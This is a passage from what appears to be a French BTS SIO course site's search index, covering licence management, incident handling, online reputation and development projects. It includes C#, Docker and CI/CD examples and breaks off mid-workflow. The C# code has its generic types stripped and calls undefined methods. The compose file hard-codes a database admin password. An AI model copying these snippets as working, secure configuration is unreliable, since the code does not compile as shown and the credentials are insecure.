\u2696\ufe0f Conformit\u00e9 L\u00e9gale              La gestion des licences logicielles assure la conformit\u00e9 l\u00e9gale, optimise les co\u00fbts et \u00e9vite les risques juridiques li\u00e9s \u00e0 l'utilisation non autoris\u00e9e de logiciels.          \ud83d\udcdc Types de Licences                  Propri\u00e9taires, open source, SaaS, par utilisateur, par processeur, volume, OEM.              \ud83d\udcc8 Suivi d'Utilisation                  Monitoring des installations, utilisations effectives et respect des termes contractuels.              \ud83d\udcb0 Optimisation                  R\u00e9duction des co\u00fbts par la rationalisation et la n\u00e9gociation de contrats group\u00e9s.                       \u26a0\ufe0f Risques : L'utilisation de logiciels sans licence appropri\u00e9e peut entra\u00eener des amendes importantes, des poursuites judiciaires et une atteinte \u00e0 la r\u00e9putation de l'entreprise.               \ud83d\udca1 Outils d'audit : Microsoft VAMT, Flexera FlexNet Manager, Snow License Manager ou des audits manuels r\u00e9guliers permettent de maintenir la conformit\u00e9 des licences.      \ud83d\udd04 Cycle de Vie des \u00c9quipements \u23f0 Gestion du Cycle de Vie              Le cycle de vie des \u00e9quipements informatiques comprend les phases d'acquisition, d\u00e9ploiement, maintenance, \u00e9volution et fin de vie.          \ud83d\udce6 Acquisition Achat, r\u00e9ception et enregistrement dans l'inventaire \ud83d\ude80 D\u00e9ploiement Installation, configuration et mise en service \ud83d\udd27 Maintenance Support, mises \u00e0 jour et r\u00e9parations \ud83d\udcc8 \u00c9volution Upgrades, migrations et am\u00e9liorations \u267b\ufe0f Fin de Vie D\u00e9commissionnement, effacement et recyclage          \ud83d\udca1 Planification : Anticipez le renouvellement des \u00e9quipements en surveillant les indicateurs de performance, l'\u00e2ge des mat\u00e9riels et les \u00e9volutions technologiques.      \ud83d\udee1\ufe0f S\u00e9curit\u00e9 du Patrimoine \ud83d\udd12 Protection des Assets              La s\u00e9curit\u00e9 du patrimoine informatique implique la protection physique et logique des \u00e9quipements, donn\u00e9es et infrastructures contre les menaces internes et externes.          \ud83c\udfe2 S\u00e9curit\u00e9 Physique                  Contr\u00f4le d'acc\u00e8s, surveillance, protection contre les sinistres et s\u00e9curisation des locaux techniques.              \ud83d\udcbb S\u00e9curit\u00e9 Logique                  Authentification, chiffrement, antivirus, pare-feu et gestion des droits d'acc\u00e8s.              \ud83d\udccb Conformit\u00e9                  Respect des normes ISO 27001, RGPD, SOX et autres r\u00e9glementations sectorielles.                       \u26a0\ufe0f Attention : Un patrimoine mal s\u00e9curis\u00e9 expose l'organisation \u00e0 des risques de vol de donn\u00e9es, d'espionnage industriel et de non-conformit\u00e9 r\u00e9glementaire.      \ud83d\udcc8 Indicateurs et Tableaux de Bord \ud83d\udcca Pilotage par les M\u00e9triques              Les indicateurs de performance (KPI) permettent de mesurer l'efficacit\u00e9 de la gestion du patrimoine et d'identifier les axes d'am\u00e9lioration.          \ud83d\udcb0 Co\u00fbt Total (TCO)                  Acquisition + maintenance + support + formation + fin de vie sur la dur\u00e9e de vie compl\u00e8te.              \u26a1 Disponibilit\u00e9                  Taux de disponibilit\u00e9 des services, MTBF (temps moyen entre pannes) et MTTR (temps de r\u00e9paration).              \ud83d\udcca Utilisation                  Taux d'utilisation des ressources, licences inutilis\u00e9es et optimisation des capacit\u00e9s.                       \ud83d\udca1 Outils de reporting : Microsoft Power BI, Tableau, QlikView ou des solutions int\u00e9gr\u00e9es dans les ITSM permettent de cr\u00e9er des tableaux de bord personnalis\u00e9s pour le suivi des m\u00e9triques.               \ud83d\udca1 Tableau de bord : Utilisez des outils comme Power BI, Grafana ou des dashboards personnalis\u00e9s pour visualiser les m\u00e9triques en temps r\u00e9el et faciliter la prise de d\u00e9cision."},{"location":"BTS/B1/B1_2_Incidents_assistance/","title":"B1 2 Incidents assistance","text":"\ud83d\udea8 Gestion des Incidents et Assistance <p>BTS SIO SLAM - Bloc 1 : Support et mise \u00e0 disposition de services informatiques</p> \ud83c\udfaf Qu'est-ce qu'un incident informatique ? \ud83d\udea8 D\u00e9finition ITIL              Un incident est une interruption non planifi\u00e9e d'un service informatique ou une r\u00e9duction de la qualit\u00e9 d'un service. L'objectif principal est de restaurer le service normal le plus rapidement possible.          \u26a1 Interruption                  Arr\u00eat complet d'un service : panne serveur, coupure r\u00e9seau, application inaccessible.              \ud83d\udcc9 D\u00e9gradation                  R\u00e9duction de performance : lenteur r\u00e9seau, temps de r\u00e9ponse \u00e9lev\u00e9, fonctionnalit\u00e9s limit\u00e9es.              \ud83d\udd27 Dysfonctionnement                  Comportement anormal : erreurs applicatives, donn\u00e9es corrompues, fonctionnalit\u00e9s d\u00e9faillantes.              \ud83d\udc65 Impact Utilisateur                  G\u00eane pour les utilisateurs : impossibilit\u00e9 de travailler, perte de productivit\u00e9, frustration.                       \u26a0\ufe0f Distinction importante : Un incident diff\u00e8re d'un probl\u00e8me. L'incident est l'effet visible, le probl\u00e8me est la cause sous-jacente qui peut g\u00e9n\u00e9rer plusieurs incidents.      \ud83d\udcca Classification et Priorisation \ud83c\udfaf Matrice Impact/Urgence              La priorit\u00e9 d'un incident se d\u00e9termine en croisant son impact (nombre d'utilisateurs affect\u00e9s) et son urgence (d\u00e9lai acceptable de r\u00e9solution).          \ud83d\udd34 CRITIQUE Impact \u00e9lev\u00e9 + Urgence \u00e9lev\u00e9e \ud83d\udfe0 \u00c9LEV\u00c9E Impact \u00e9lev\u00e9 + Urgence faible \ud83d\udfe1 MOYENNE Impact faible + Urgence \u00e9lev\u00e9e \ud83d\udfe2 FAIBLE Impact faible + Urgence faible \ud83d\udc65 Impact \u00c9lev\u00e9 : Tous les utilisateurs Moyen : Un service/d\u00e9partement Faible : Utilisateur individuel              \u23f0 Urgence \u00c9lev\u00e9e : R\u00e9solution imm\u00e9diate Moyenne : R\u00e9solution dans la journ\u00e9e Faible : R\u00e9solution sous 48-72h                       \ud83d\udca1 Outils de classification : Les syst\u00e8mes ITSM modernes proposent des matrices de priorit\u00e9 configurables et des r\u00e8gles automatiques de classification bas\u00e9es sur des mots-cl\u00e9s ou des crit\u00e8res pr\u00e9d\u00e9finis.      \ud83d\udd04 Processus de Gestion des Incidents \ud83d\udccb Cycle de Vie d'un Incident              Le processus de gestion des incidents suit un cycle structur\u00e9 depuis la d\u00e9tection jusqu'\u00e0 la cl\u00f4ture, en passant par l'analyse, la r\u00e9solution et la validation.          1 D\u00e9tection Identification et signalement de l'incident 2 Enregistrement Cr\u00e9ation du ticket avec informations d\u00e9taill\u00e9es 3 Classification \u00c9valuation impact, urgence et priorit\u00e9 4 Investigation Diagnostic et recherche de solution 5 R\u00e9solution Application de la solution et tests 6 Cl\u00f4ture Validation utilisateur et documentation          \ud83d\udca1 Workflows automatis\u00e9s : Les outils ITSM (IT Service Management) permettent de configurer des workflows avec transitions automatiques, notifications et escalades selon des r\u00e8gles m\u00e9tier personnalisables.      \ud83c\udfa7 Service Desk et Support Utilisateur \ud83d\udcde Point de Contact Unique              Le Service Desk est le point de contact unique entre les utilisateurs et l'\u00e9quipe IT. Il centralise les demandes, incidents et questions pour assurer un service coh\u00e9rent et tra\u00e7able.          \ud83d\udcde Support T\u00e9l\u00e9phonique                  Assistance en temps r\u00e9el, r\u00e9solution imm\u00e9diate des probl\u00e8mes simples, escalade si n\u00e9cessaire.              \ud83d\udcac Chat en Ligne                  Support instantan\u00e9, partage d'\u00e9cran, r\u00e9solution collaborative des incidents.              \ud83c\udfab Syst\u00e8me de Tickets                  Tra\u00e7abilit\u00e9 compl\u00e8te, suivi des demandes, historique des interventions.              \ud83d\udd27 Support \u00e0 Distance                  Prise de contr\u00f4le \u00e0 distance, diagnostic avanc\u00e9, r\u00e9solution sans d\u00e9placement.                       \ud83d\udca1 Portails self-service : Les portails utilisateur permettent la cr\u00e9ation autonome de tickets, le suivi en temps r\u00e9el et l'acc\u00e8s \u00e0 une base de connaissances pour l'auto-r\u00e9solution.      \ud83d\udcc8 M\u00e9triques et Indicateurs de Performance \ud83d\udcca KPI du Service Desk              Les indicateurs de performance permettent de mesurer l'efficacit\u00e9 du support, identifier les axes d'am\u00e9lioration et d\u00e9montrer la valeur ajout\u00e9e du service IT.          \u23f1\ufe0f Temps de R\u00e9solution MTTR : Mean Time To Repair                 Temps moyen entre l'ouverture et la r\u00e9solution d'un incident.              \ud83d\udcde Temps de R\u00e9ponse                  D\u00e9lai entre la cr\u00e9ation du ticket et la premi\u00e8re intervention du support.              \u2705 Taux de R\u00e9solution                  Pourcentage d'incidents r\u00e9solus au premier niveau vs escalad\u00e9s.              \ud83d\ude0a Satisfaction Client                  \u00c9valuation de la qualit\u00e9 du service par les utilisateurs finaux."},{"location":"BTS/B1/B1_3_Presence_ligne/","title":"B1 3 Presence ligne","text":"\ud83c\udf10 Pr\u00e9sence en Ligne et E-r\u00e9putation <p>BTS SIO SLAM - Bloc 1 : Support et mise \u00e0 disposition de services informatiques</p> \ud83c\udfaf Comprendre la Pr\u00e9sence Num\u00e9rique \ud83c\udf0d Qu'est-ce que la Pr\u00e9sence en Ligne ?              La pr\u00e9sence en ligne repr\u00e9sente l'ensemble des traces num\u00e9riques qu'une personne ou une organisation laisse sur Internet. Cette empreinte digitale se compose de tous les contenus, interactions et informations visibles sur le web qui contribuent \u00e0 forger une identit\u00e9 num\u00e9rique unique et durable.                   Dans le contexte professionnel du BTS SIO, la ma\u00eetrise de la pr\u00e9sence en ligne devient cruciale. Chaque publication, commentaire, photo ou interaction contribue \u00e0 construire une r\u00e9putation qui peut influencer les opportunit\u00e9s de carri\u00e8re, les relations professionnelles et la cr\u00e9dibilit\u00e9 dans le domaine informatique.               La pr\u00e9sence num\u00e9rique ne se limite pas aux r\u00e9seaux sociaux traditionnels. Elle englobe \u00e9galement les forums techniques, les plateformes de d\u00e9veloppement comme GitHub, les blogs professionnels, les contributions \u00e0 des projets open source, et m\u00eame les commentaires laiss\u00e9s sur des articles sp\u00e9cialis\u00e9s. Pour un futur professionnel de l'informatique, cette pr\u00e9sence peut devenir un v\u00e9ritable portfolio num\u00e9rique.      \ud83d\udcbc LinkedIn \ud83d\udc26 Twitter/X \ud83d\udc65 Facebook \ud83d\udcf8 Instagram \ud83c\udfa5 YouTube \ud83c\udfb5 TikTok          \u26a0\ufe0f Permanence du num\u00e9rique : Tout ce qui est publi\u00e9 en ligne peut \u00eatre archiv\u00e9, partag\u00e9 et resurgir des ann\u00e9es plus tard. La r\u00e8gle d'or est de ne jamais publier quelque chose que vous ne voudriez pas voir affich\u00e9 sur un panneau publicitaire.      \ud83c\udfc6 L'E-r\u00e9putation : Un Capital \u00e0 Pr\u00e9server \u2b50 D\u00e9finition de l'E-r\u00e9putation              L'e-r\u00e9putation correspond \u00e0 la perception qu'ont les internautes d'une personne, d'une marque ou d'une organisation, bas\u00e9e sur l'ensemble des informations disponibles en ligne. Cette r\u00e9putation num\u00e9rique influence directement la confiance, la cr\u00e9dibilit\u00e9 et les opportunit\u00e9s professionnelles.                   Pour un professionnel de l'informatique, l'e-r\u00e9putation rev\u00eat une importance particuli\u00e8re. Les recruteurs consultent syst\u00e9matiquement les profils en ligne des candidats, et une r\u00e9putation positive peut faire la diff\u00e9rence lors d'un processus de recrutement. \u00c0 l'inverse, des contenus inappropri\u00e9s ou des prises de position controvers\u00e9es peuvent compromettre des opportunit\u00e9s professionnelles.               L'e-r\u00e9putation se construit progressivement \u00e0 travers chaque interaction en ligne. Elle peut \u00e9voluer rapidement, particuli\u00e8rement en cas de crise ou de pol\u00e9mique. La vitesse de propagation de l'information sur Internet amplifie consid\u00e9rablement l'impact des \u00e9v\u00e9nements, qu'ils soient positifs ou n\u00e9gatifs.      \ud83d\udca1 Exemple concret         Un d\u00e9veloppeur qui partage r\u00e9guli\u00e8rement ses connaissances techniques sur LinkedIn, contribue \u00e0 des projets open source sur GitHub et participe constructivement \u00e0 des discussions sur Stack Overflow construit progressivement une r\u00e9putation d'expert dans son domaine. Cette r\u00e9putation peut lui ouvrir des portes pour des postes \u00e0 responsabilit\u00e9s ou des missions de consulting.               \ud83d\udea8 Risques majeurs : Une e-r\u00e9putation d\u00e9grad\u00e9e peut entra\u00eener des refus d'embauche, des pertes de contrats, une diminution de la cr\u00e9dibilit\u00e9 professionnelle et des difficult\u00e9s \u00e0 \u00e9tablir des partenariats.      \ud83d\udcf1 Strat\u00e9gies de Pr\u00e9sence Professionnelle \ud83c\udfaf Approche Strat\u00e9gique de la Communication              Une pr\u00e9sence en ligne efficace n\u00e9cessite une approche r\u00e9fl\u00e9chie et coh\u00e9rente. Il ne s'agit pas simplement d'\u00eatre pr\u00e9sent sur toutes les plateformes, mais de choisir les canaux appropri\u00e9s et d'adapter le message \u00e0 chaque audience.          \ud83d\udcdd Cr\u00e9ation de Contenu de Qualit\u00e9              La production de contenu original et pertinent constitue le pilier d'une pr\u00e9sence en ligne r\u00e9ussie. Pour un professionnel de l'informatique, cela peut prendre la forme d'articles techniques, de tutoriels, de retours d'exp\u00e9rience sur des projets, ou de analyses de nouvelles technologies. L'objectif est de d\u00e9montrer son expertise tout en apportant de la valeur \u00e0 la communaut\u00e9.          \ud83d\udcac Engagement et Interaction              L'interaction avec la communaut\u00e9 professionnelle est cruciale pour d\u00e9velopper un r\u00e9seau et renforcer sa visibilit\u00e9. Cela implique de r\u00e9pondre aux commentaires, de participer \u00e0 des discussions, de partager et commenter les contenus d'autres professionnels, et de contribuer \u00e0 des groupes sp\u00e9cialis\u00e9s. La cr\u00e9ation d'un r\u00e9seau professionnel peut \u00eatre b\u00e9n\u00e9fique et diff\u00e9rencier plusieurs dossiers lors d'une campagne de rectrutement.                       L'engagement doit \u00eatre authentique et constructif. Il ne s'agit pas de multiplier les interactions superficielles, mais d'apporter une r\u00e9elle valeur ajout\u00e9e aux conversations. Une approche respectueuse et professionnelle dans tous les \u00e9changes contribue \u00e0 construire une r\u00e9putation positive.          \ud83d\udcca Mesure et Optimisation              Le suivi des performances permet d'ajuster la strat\u00e9gie de pr\u00e9sence en ligne. Les m\u00e9triques importantes incluent la port\u00e9e des publications, le taux d'engagement, la croissance de l'audience, et surtout la qualit\u00e9 des interactions g\u00e9n\u00e9r\u00e9es.          \ud83d\udee1\ufe0f Protection et Gestion des Risques \ud83d\udd12 S\u00e9curisation de l'Identit\u00e9 Num\u00e9rique              La protection de l'identit\u00e9 num\u00e9rique implique la mise en place de mesures pr\u00e9ventives pour \u00e9viter l'usurpation d'identit\u00e9, la diffusion de fausses informations, et la compromission des comptes professionnels.                   La s\u00e9curisation des comptes constitue la premi\u00e8re ligne de d\u00e9fense. L'utilisation de mots de passe robustes et uniques pour chaque plateforme (ou l'utilisation d'un gestionnaire de mots de passe), l'activation de l'authentification \u00e0 deux facteurs, et la v\u00e9rification r\u00e9guli\u00e8re des param\u00e8tres de confidentialit\u00e9 sont des pratiques essentielles.               La veille sur sa propre r\u00e9putation permet de d\u00e9tecter rapidement les mentions n\u00e9gatives ou les tentatives d'usurpation d'identit\u00e9. Des outils de monitoring peuvent alerter en cas de nouvelle mention du nom ou de l'entreprise sur le web, permettant une r\u00e9action rapide en cas de probl\u00e8me.      \ud83d\udd0d Techniques de Veille         La mise en place d'alertes Google sur son nom et celui de son entreprise permet de surveiller les nouvelles mentions.      \ud83d\udea8 Gestion de Crise              La transparence et l'authenticit\u00e9 sont g\u00e9n\u00e9ralement les meilleures approches en cas de crise. Reconna\u00eetre ses erreurs, pr\u00e9senter des excuses sinc\u00e8res si n\u00e9cessaire, et expliquer les mesures correctives mises en place contribuent souvent \u00e0 limiter les d\u00e9g\u00e2ts et parfois m\u00eame \u00e0 renforcer la confiance.                   \u26a0\ufe0f R\u00e8gle de base : En cas de pol\u00e9mique, \u00e9vitez les r\u00e9actions \u00e0 chaud. Prenez le temps de r\u00e9fl\u00e9chir \u00e0 une r\u00e9ponse appropri\u00e9e et, si n\u00e9cessaire, faites-vous accompagner par des professionnels de la communication.      \ud83d\udcc8 Optimisation pour les Moteurs de Recherche \ud83d\udd0d SEO Personnel et Professionnel              L'optimisation pour les moteurs de recherche (SEO) appliqu\u00e9e \u00e0 l'identit\u00e9 num\u00e9rique vise \u00e0 contr\u00f4ler les r\u00e9sultats qui apparaissent lors d'une recherche sur son nom ou celui de son entreprise.                   La cr\u00e9ation et l'optimisation de profils professionnels sur les principales plateformes (LinkedIn, GitHub pour les d\u00e9veloppeurs) permettent de contr\u00f4ler les premiers r\u00e9sultats de recherche. Ces profils doivent \u00eatre complets, r\u00e9guli\u00e8rement mis \u00e0 jour, et optimis\u00e9s avec les mots-cl\u00e9s pertinents du secteur d'activit\u00e9.      \ud83c\udfaf Pr\u00e9sence Professionnelle Sp\u00e9cialis\u00e9e \ud83d\udcbc Plateformes M\u00e9tier pour l'Informatique              Pour les professionnels de l'informatique, certaines plateformes sp\u00e9cialis\u00e9es sont incontournables pour d\u00e9velopper une pr\u00e9sence professionnelle cr\u00e9dible et \u00e9tablir son expertise technique.          \ud83d\udd27 GitHub : Portfolio de D\u00e9veloppeur              GitHub constitue le CV technique de r\u00e9f\u00e9rence pour tout d\u00e9veloppeur. Un profil GitHub bien entretenu, avec des projets vari\u00e9s, une activit\u00e9 r\u00e9guli\u00e8re et des contributions \u00e0 des projets open source, d\u00e9montre concr\u00e8tement les comp\u00e9tences techniques et l'engagement dans la communaut\u00e9 de d\u00e9veloppement.                       La qualit\u00e9 du code, la documentation des projets, et la r\u00e9gularit\u00e9 des contributions sont scrut\u00e9es par les recruteurs techniques. Un historique de commits r\u00e9gulier et des projets bien document\u00e9s t\u00e9moignent du professionnalisme et de la rigueur du d\u00e9veloppeur.          \ud83d\udca1 Stack Overflow : Expertise Reconnue              La participation active \u00e0 Stack Overflow, en r\u00e9pondant aux questions techniques et en posant des questions pertinentes, permet de d\u00e9montrer son expertise et sa capacit\u00e9 \u00e0 r\u00e9soudre des probl\u00e8mes complexes. Un score \u00e9lev\u00e9 et des r\u00e9ponses bien not\u00e9es constituent une reconnaissance par les pairs."},{"location":"BTS/B1/B1_4_6_Projet_dev/","title":"B1 4 6 Projet dev","text":"\ud83d\udcbb Projet de D\u00e9veloppement <p>BTS SIO SLAM - Bloc 1 : Support et mise \u00e0 disposition de services informatiques</p> \ud83c\udfaf Qu'est-ce qu'un Projet de D\u00e9veloppement ? \ud83d\ude80 D\u00e9finition du Projet de D\u00e9veloppement              Un projet de d\u00e9veloppement est une d\u00e9marche structur\u00e9e visant \u00e0 cr\u00e9er une solution logicielle r\u00e9pondant \u00e0 un besoin sp\u00e9cifique. Il implique la planification, la conception, le d\u00e9veloppement, les tests et le d\u00e9ploiement d'une application ou d'un syst\u00e8me informatique.          \ud83d\udccb Planification                  D\u00e9finition des objectifs, des ressources n\u00e9cessaires, du planning et des livrables attendus.              \ud83c\udfa8 Conception                  \u00c9laboration de l'architecture, des maquettes et des sp\u00e9cifications techniques d\u00e9taill\u00e9es.              \u2699\ufe0f D\u00e9veloppement                  Impl\u00e9mentation du code source selon les sp\u00e9cifications et les bonnes pratiques de d\u00e9veloppement.              \ud83e\uddea Tests                  Validation du fonctionnement, d\u00e9tection des bugs et v\u00e9rification de la conformit\u00e9 aux exigences.                       \ud83d\udca1 Bon \u00e0 savoir : Un projet de d\u00e9veloppement r\u00e9ussi combine comp\u00e9tences techniques, gestion de projet et communication efficace avec les parties prenantes.      \ud83d\udcca M\u00e9thodologies de Gestion de Projet \ud83d\udd04 Approches M\u00e9thodologiques              Les m\u00e9thodologies de gestion de projet fournissent un cadre structur\u00e9 pour organiser, planifier et contr\u00f4ler le d\u00e9veloppement d'un projet informatique. Chaque approche a ses avantages selon le contexte et les contraintes.          \ud83d\udcc8 M\u00e9thode en Cascade                  Approche s\u00e9quentielle o\u00f9 chaque phase doit \u00eatre termin\u00e9e avant de passer \u00e0 la suivante. Id\u00e9ale pour les projets aux exigences stables.              \ud83d\udd04 M\u00e9thode Agile                  Approche it\u00e9rative et collaborative privil\u00e9giant l'adaptation au changement et la livraison continue de valeur.              \ud83d\udccb Scrum                  Framework agile organisant le travail en sprints courts avec des r\u00f4les d\u00e9finis (Product Owner, Scrum Master, \u00e9quipe).              \ud83c\udfaf Kanban                  M\u00e9thode visuelle de gestion des flux de travail bas\u00e9e sur des tableaux et la limitation du travail en cours.              \ud83d\udcbb Exemple : Gestion de Projet Agile en C# <pre><code>// Mod\u00e8le pour la gestion d'un projet Agile\npublic class AgileProject\n{\n    public int Id { get; set; }\n    public string Name { get; set; }\n    public string Description { get; set; }\n    public DateTime StartDate { get; set; }\n    public DateTime? EndDate { get; set; }\n    public ProjectStatus Status { get; set; }\n    public List Sprints { get; set; } = new List();\n    public List Backlog { get; set; } = new List();\n    public List Team { get; set; } = new List();\n\n    public Sprint CreateNewSprint(string name, DateTime startDate, DateTime endDate)\n    {\n        var sprint = new Sprint\n        {\n            Id = Sprints.Count + 1,\n            Name = name,\n            StartDate = startDate,\n            EndDate = endDate,\n            Status = SprintStatus.Planning,\n            ProjectId = this.Id\n        };\n\n        Sprints.Add(sprint);\n        return sprint;\n    }\n\n    public void AddUserStory(string title, string description, int storyPoints, Priority priority)\n    {\n        var userStory = new UserStory\n        {\n            Id = Backlog.Count + 1,\n            Title = title,\n            Description = description,\n            StoryPoints = storyPoints,\n            Priority = priority,\n            Status = UserStoryStatus.New,\n            CreatedDate = DateTime.UtcNow\n        };\n\n        Backlog.Add(userStory);\n    }\n\n    public List GetPrioritizedBacklog()\n    {\n        return Backlog\n            .Where(us =&gt; us.Status != UserStoryStatus.Done)\n            .OrderBy(us =&gt; us.Priority)\n            .ThenByDescending(us =&gt; us.StoryPoints)\n            .ToList();\n    }\n\n    public ProjectMetrics CalculateMetrics()\n    {\n        var completedStories = Backlog.Count(us =&gt; us.Status == UserStoryStatus.Done);\n        var totalStories = Backlog.Count;\n        var completedSprints = Sprints.Count(s =&gt; s.Status == SprintStatus.Completed);\n\n        return new ProjectMetrics\n        {\n            CompletionPercentage = totalStories &gt; 0 ? (double)completedStories / totalStories * 100 : 0,\n            Velocity = CalculateAverageVelocity(),\n            BurndownRate = CalculateBurndownRate(),\n            TeamProductivity = CalculateTeamProductivity()\n        };\n    }\n\n    private double CalculateAverageVelocity()\n    {\n        var completedSprints = Sprints.Where(s =&gt; s.Status == SprintStatus.Completed).ToList();\n        if (!completedSprints.Any()) return 0;\n\n        var totalStoryPoints = completedSprints.Sum(s =&gt; s.CompletedStoryPoints);\n        return (double)totalStoryPoints / completedSprints.Count;\n    }\n}\n\npublic class Sprint\n{\n    public int Id { get; set; }\n    public string Name { get; set; }\n    public DateTime StartDate { get; set; }\n    public DateTime EndDate { get; set; }\n    public SprintStatus Status { get; set; }\n    public int ProjectId { get; set; }\n    public List UserStories { get; set; } = new List();\n    public int CompletedStoryPoints =&gt; UserStories.Where(us =&gt; us.Status == UserStoryStatus.Done).Sum(us =&gt; us.StoryPoints);\n\n    public void StartSprint()\n    {\n        Status = SprintStatus.Active;\n        foreach (var story in UserStories)\n        {\n            if (story.Status == UserStoryStatus.New)\n            {\n                story.Status = UserStoryStatus.InProgress;\n            }\n        }\n    }\n\n    public void CompleteSprint()\n    {\n        Status = SprintStatus.Completed;\n        // D\u00e9placer les stories non termin\u00e9es vers le backlog\n        var incompleteStories = UserStories.Where(us =&gt; us.Status != UserStoryStatus.Done).ToList();\n        // Logique pour remettre dans le backlog\n    }\n}\n\npublic enum ProjectStatus { Planning, Active, OnHold, Completed, Cancelled }\npublic enum SprintStatus { Planning, Active, Review, Retrospective, Completed }\npublic enum UserStoryStatus { New, InProgress, Testing, Done }\npublic enum Priority { Low = 1, Medium = 2, High = 3, Critical = 4 }\n    \n\n\n\n    \ud83d\udd04 Phases du Cycle de D\u00e9veloppement\n\n    \n        \ud83d\udcc8 Cycle de Vie du D\u00e9veloppement Logiciel (SDLC)\n        \n            Le cycle de vie du d\u00e9veloppement logiciel d\u00e9crit les \u00e9tapes successives n\u00e9cessaires pour cr\u00e9er un logiciel de qualit\u00e9, depuis l'analyse des besoins jusqu'\u00e0 la maintenance en production.\n        \n    \n\n    \n        \n            1\n            \n                \ud83d\udccb Analyse des Besoins\n                \n                    Collecte et analyse des exigences fonctionnelles et non-fonctionnelles. D\u00e9finition du p\u00e9rim\u00e8tre du projet et des crit\u00e8res d'acceptation.\n                \n            \n        \n\n        \n            2\n            \n                \ud83c\udfa8 Conception\n                \n                    \u00c9laboration de l'architecture technique, des maquettes UI/UX, du mod\u00e8le de donn\u00e9es et des sp\u00e9cifications d\u00e9taill\u00e9es.\n                \n            \n        \n\n        \n            3\n            \n                \u2699\ufe0f D\u00e9veloppement\n                \n                    Impl\u00e9mentation du code source, int\u00e9gration des composants et d\u00e9veloppement des fonctionnalit\u00e9s selon les sp\u00e9cifications.\n                \n            \n        \n\n        \n            4\n            \n                \ud83e\uddea Tests\n                \n                    Tests unitaires, d'int\u00e9gration, fonctionnels et de performance. Validation de la conformit\u00e9 aux exigences.\n                \n            \n        \n\n        \n            5\n            \n                \ud83d\ude80 D\u00e9ploiement\n                \n                    Mise en production, configuration des environnements, migration des donn\u00e9es et formation des utilisateurs.\n                \n            \n        \n\n        \n            6\n            \n                \ud83d\udd27 Maintenance\n                \n                    Support technique, corrections de bugs, \u00e9volutions fonctionnelles et optimisations de performance.\n                \n            \n        \n    \n\n    \n        \u26a0\ufe0f Important : Ces phases peuvent \u00eatre it\u00e9ratives dans les m\u00e9thodologies agiles, permettant des ajustements continus selon les retours utilisateurs.\n    \n\n\n\n    \ud83d\udee0\ufe0f Outils et Technologies\n\n    \n        \u26a1 \u00c9cosyst\u00e8me de D\u00e9veloppement\n        \n            Un projet de d\u00e9veloppement moderne s'appuie sur un \u00e9cosyst\u00e8me d'outils couvrant l'ensemble du cycle de vie : IDE, contr\u00f4le de version, bases de donn\u00e9es, tests, d\u00e9ploiement et monitoring.\n        \n    \n\n    \n        \n            \ud83d\udcbb\n            IDE &amp; \u00c9diteurs\n            Visual Studio, VS Code, JetBrains\n        \n\n        \n            \ud83d\udd04\n            Contr\u00f4le de Version\n            Git, GitHub, GitLab, Azure DevOps\n        \n\n        \n            \ud83d\uddc4\ufe0f\n            Bases de Donn\u00e9es\n            SQL Server, PostgreSQL, MongoDB\n        \n\n        \n            \ud83e\uddea\n            Tests\n            xUnit, NUnit, Selenium, Postman\n        \n\n        \n            \ud83d\ude80\n            D\u00e9ploiement\n            Docker, Kubernetes, Azure, AWS\n        \n\n        \n            \ud83d\udcca\n            Monitoring\n            Application Insights, Grafana, ELK\n        \n    \n\n    \n        \ud83d\udcbb Exemple : Configuration DevOps avec C# et Docker\n        <pre><code># Dockerfile pour une application ASP.NET Core\nFROM mcr.microsoft.com/dotnet/aspnet:8.0 AS base\nWORKDIR /app\nEXPOSE 80\nEXPOSE 443\n\nFROM mcr.microsoft.com/dotnet/sdk:8.0 AS build\nWORKDIR /src\nCOPY [\"MyProject.Api/MyProject.Api.csproj\", \"MyProject.Api/\"]\nCOPY [\"MyProject.Core/MyProject.Core.csproj\", \"MyProject.Core/\"]\nCOPY [\"MyProject.Infrastructure/MyProject.Infrastructure.csproj\", \"MyProject.Infrastructure/\"]\nRUN dotnet restore \"MyProject.Api/MyProject.Api.csproj\"\nCOPY . .\nWORKDIR \"/src/MyProject.Api\"\nRUN dotnet build \"MyProject.Api.csproj\" -c Release -o /app/build\n\nFROM build AS publish\nRUN dotnet publish \"MyProject.Api.csproj\" -c Release -o /app/publish\n\nFROM base AS final\nWORKDIR /app\nCOPY --from=publish /app/publish .\nENTRYPOINT [\"dotnet\", \"MyProject.Api.dll\"]\n\n# docker-compose.yml pour l'environnement de d\u00e9veloppement\nversion: '3.8'\nservices:\n  api:\n    build:\n      context: .\n      dockerfile: Dockerfile\n    ports:\n      - \"5000:80\"\n      - \"5001:443\"\n    environment:\n      - ASPNETCORE_ENVIRONMENT=Development\n      - ConnectionStrings__DefaultConnection=Server=db;Database=MyProjectDb;User=sa;Password=YourPassword123;\n    depends_on:\n      - db\n    volumes:\n      - ./logs:/app/logs\n\n  db:\n    image: mcr.microsoft.com/mssql/server:2022-latest\n    environment:\n      - ACCEPT_EULA=Y\n      - SA_PASSWORD=YourPassword123\n      - MSSQL_PID=Express\n    ports:\n      - \"1433:1433\"\n    volumes:\n      - sqlserver_data:/var/opt/mssql\n\n  redis:\n    image: redis:alpine\n    ports:\n      - \"6379:6379\"\n    volumes:\n      - redis_data:/data\n\nvolumes:\n  sqlserver_data:\n  redis_data:</code></pre>\n    \n\n    \n        \ud83d\udcbb Exemple : Pipeline CI/CD avec GitHub Actions\n        <pre><code># .github/workflows/ci-cd.yml\nname: CI/CD Pipeline\n\non:\n  push:\n    branches: [ main, develop ]\n  pull_request:\n    branches: [ main ]\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n\n    steps:\n    - uses: actions/checkout@v3\n\n    - name: Setup .NET\n      uses: actions/setup-dotnet@v3\n      with:\n        dotnet-version: '8.0.x'\n\n    - name: Restore dependencies\n      run: dotnet restore\n\n    - name: Build\n      run: dotnet build --no-restore --configuration Release\n\n    - name: Run unit tests\n      run: dotnet test --no-build --configuration Release --logger trx --collect:\"XPlat Code Coverage\"\n\n    - name: Generate test report\n      uses: dorny/test-reporter@v1\n      if: success() || failure()\n      with:\n        name: .NET Tests\n        path: '**/*.trx'\n        reporter: dotnet-trx\n\n    - name: Code coverage\n      uses: codecov/codecov-action@v3\n      with:\n        files: '**/coverage.cobertura.xml'\n\n  security-scan:\n    runs-on: ubuntu-latest\n    needs: test\n\n    steps:\n    - uses: actions/checkout@v3\n\n    - name: Run security scan\n      uses: securecodewarrior/github-action-add-sarif@v1\n      with:\n        sarif-file: 'security-scan-results.sarif'\n\n  deploy:\n    runs-on: ubuntu-latest\n    needs: [test, security-scan]\n    if: github.ref == 'refs/heads/main'\n\n    steps:\n    - uses: 